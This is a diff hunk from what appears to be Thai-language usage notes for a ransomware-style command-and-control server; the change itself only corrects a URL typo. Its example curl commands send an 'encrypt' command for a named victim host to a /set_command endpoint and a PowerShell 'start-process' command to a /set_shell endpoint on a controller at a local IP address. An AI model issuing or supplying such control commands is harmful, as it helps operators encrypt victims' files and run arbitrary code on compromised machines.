@@ -64,7 +64,7 @@ curl -X POST -H "Content-Type: application/json" -d '{"hostname": "<ชื่อ
 
 
 ตัวอย่าง -> curl -X POST -H "Content-Type: application/json" -d '{"hostname": "DESKTOP-BKQ27N9", "cmd": "encrypt"}' http://192.168.10.151:8080/set_command
-ตัวอย่าง curl -X POST -H "Content-Type: application/json" -d '{"hostname": "DESKTOP-BKQ27N9", "pws": "start-process httpa://google.com"}' http://192.168.10.151:8080/set_shell
+ตัวอย่าง curl -X POST -H "Content-Type: application/json" -d '{"hostname": "DESKTOP-BKQ27N9", "pws": "start-process https://google.com"}' http://192.168.10.151:8080/set_shell
 
 
 
